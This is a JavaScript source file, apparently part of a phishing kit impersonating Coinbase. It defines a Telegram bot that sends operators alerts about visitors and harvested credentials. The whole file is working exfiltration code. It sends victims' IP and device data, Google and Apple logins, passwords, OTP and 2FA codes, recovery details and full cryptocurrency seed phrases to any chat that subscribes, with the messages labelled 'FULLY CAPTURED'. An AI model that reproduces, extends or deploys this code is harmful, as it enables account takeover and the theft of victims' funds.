const TelegramBot = require('node-telegram-bot-api');

// Initialize bot with polling to receive messages
let bot = null;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// Store all chat IDs that have started the bot
const subscribedChats = new Set();

// Initialize with default chat ID if provided (for backward compatibility)
if (process.env.TELEGRAM_CHAT_ID) {
  subscribedChats.add(process.env.TELEGRAM_CHAT_ID);
}

if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
  console.log('✅ Telegram bot initialized with polling');
  
  // Handle /start command - add user to subscribers
  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    subscribedChats.add(chatId);
    
    bot.sendMessage(chatId, `
🎉 *Welcome to Coinbase Clone Monitor!*

You are now subscribed to receive notifications.

You will get alerts for:
• 👁️ New visitors
• 📧 Credential captures
• ✅ Complete authentications

Total subscribers: ${subscribedChats.size}
    `, { parse_mode: 'Markdown' });
    
    console.log(`✅ New subscriber: ${chatId} (Total: ${subscribedChats.size})`);
  });
  
  // Handle /stop command - remove user from subscribers
  bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id.toString();
    subscribedChats.delete(chatId);
    
    bot.sendMessage(chatId, '👋 You have been unsubscribed from notifications.');
    console.log(`❌ Unsubscribed: ${chatId} (Total: ${subscribedChats.size})`);
  });
  
  // Handle /status command - show subscription status
  bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id.toString();
    const isSubscribed = subscribedChats.has(chatId);
    
    bot.sendMessage(chatId, `
📊 *Your Status*

Subscribed: ${isSubscribed ? '✅ Yes' : '❌ No'}
Total subscribers: ${subscribedChats.size}
Your Chat ID: \`${chatId}\`

${!isSubscribed ? 'Send /start to subscribe!' : ''}
    `, { parse_mode: 'Markdown' });
  });
  
} else {
  console.log('⚠️  Telegram bot not configured (missing TELEGRAM_BOT_TOKEN)');
}

// Helper function to format messages
const escapeMarkdown = (text) => {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
};

// Helper function to send message to all subscribers
const sendToAllSubscribers = async (message, options = {}) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('No subscribers to send to');
    return;
  }
  
  const promises = Array.from(subscribedChats).map(chatId => 
    bot.sendMessage(chatId, message, options).catch(err => {
      console.error(`Failed to send to ${chatId}:`, err.message);
      // If user blocked the bot, remove them from subscribers
      if (err.message.includes('blocked') || err.message.includes('user is deactivated')) {
        subscribedChats.delete(chatId);
        console.log(`Removed inactive user: ${chatId}`);
      }
    })
  );
  
  await Promise.all(promises);
  console.log(`✅ Sent to ${subscribedChats.size} subscribers`);
};

// Send visitor notification
const sendVisitorNotification = async (visitorData) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping visitor notification');
    return;
  }

  try {
    const message = `
🔔 *NEW VISITOR ALERT*

👤 *Visitor Details:*
━━━━━━━━━━━━━━━━━━━
📍 IP: \`${escapeMarkdown(visitorData.ipAddress)}\`
🌐 Page: ${escapeMarkdown(visitorData.page || 'Unknown')}
🗺 Timezone: ${escapeMarkdown(visitorData.timezone || 'Unknown')}
🌍 Language: ${escapeMarkdown(visitorData.language || 'Unknown')}

💻 *Device Info:*
━━━━━━━━━━━━━━━━━━━
🖥 Platform: ${escapeMarkdown(visitorData.platform || 'Unknown')}
📱 Screen: ${escapeMarkdown(visitorData.screenResolution || 'Unknown')}
🔍 Browser: ${escapeMarkdown(visitorData.userAgent?.substring(0, 60) || 'Unknown')}...

🍪 *Tracking Data:*
━━━━━━━━━━━━━━━━━━━
Cookies: ${visitorData.cookies ? '✅ Available' : '❌ None'}
Referrer: ${escapeMarkdown(visitorData.referrer || 'Direct')}

⏰ Time: ${new Date().toLocaleString()}
`;

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log('✅ Visitor notification sent to all subscribers');
  } catch (error) {
    console.error('❌ Error sending visitor notification:', error.message);
  }
};

// Send credential capture notification (initial step)
const sendCredentialStartNotification = async (provider, data) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping credential start notification');
    return;
  }

  try {
    let message = '';
    
    if (provider === 'Google') {
      message = `
🎯 *GOOGLE AUTH STARTED*

📧 *Email Entered:*
\`${escapeMarkdown(data.email)}\`

📍 *Location Info:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    } else if (provider === 'Apple') {
      message = `
🍎 *APPLE AUTH STARTED*

📧 *Apple ID Entered:*
\`${escapeMarkdown(data.appleId)}\`

📍 *Location Info:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    } else if (provider === 'Recovery Phrase') {
      message = `
🔑 *RECOVERY PHRASE STARTED*

🗝 *Seed Phrase (12 words):*
\`${escapeMarkdown(data.seedPhrase?.substring(0, 80))}\`...

📍 *Location Info:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    }

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ ${provider} start notification sent to all subscribers`);
  } catch (error) {
    console.error('❌ Error sending credential start notification:', error.message);
  }
};

// Send complete credential capture notification
const sendCredentialCompleteNotification = async (provider, data) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping credential complete notification');
    return;
  }

  try {
    let message = '';
    
    if (provider === 'Google') {
      message = `
✅ *GOOGLE AUTH COMPLETE*

🎉 *Full Credentials Captured!*
━━━━━━━━━━━━━━━━━━━
📧 Email: \`${escapeMarkdown(data.email)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`
🔢 OTP: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📮 Recovery: ${escapeMarkdown(data.recoveryEmail || 'Not provided')}

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...

⏰ ${new Date().toLocaleString()}

🎯 *Status:* FULLY CAPTURED ✅
`;
    } else if (provider === 'Apple') {
      message = `
✅ *APPLE AUTH COMPLETE*

🎉 *Full Credentials Captured!*
━━━━━━━━━━━━━━━━━━━
📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`
🔢 2FA Code: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📱 Device: ${escapeMarkdown(data.trustedDevice || 'Not provided')}

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...

⏰ ${new Date().toLocaleString()}

🎯 *Status:* FULLY CAPTURED ✅
`;
    } else if (provider === 'Recovery Phrase') {
      message = `
✅ *RECOVERY PHRASE COMPLETE*

🎉 *Full Credentials Captured!*
━━━━━━━━━━━━━━━━━━━
🔑 Seed Phrase:
\`${escapeMarkdown(data.seedPhrase)}\`

📧 Email: \`${escapeMarkdown(data.email)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(data.ipAddress)}\`
Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...

⏰ ${new Date().toLocaleString()}

🎯 *Status:* FULLY CAPTURED ✅
`;
    }

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ ${provider} complete notification sent to all subscribers`);
  } catch (error) {
    console.error('❌ Error sending credential complete notification:', error.message);
  }
};

module.exports = {
  sendVisitorNotification,
  sendCredentialStartNotification,
  sendCredentialCompleteNotification
};
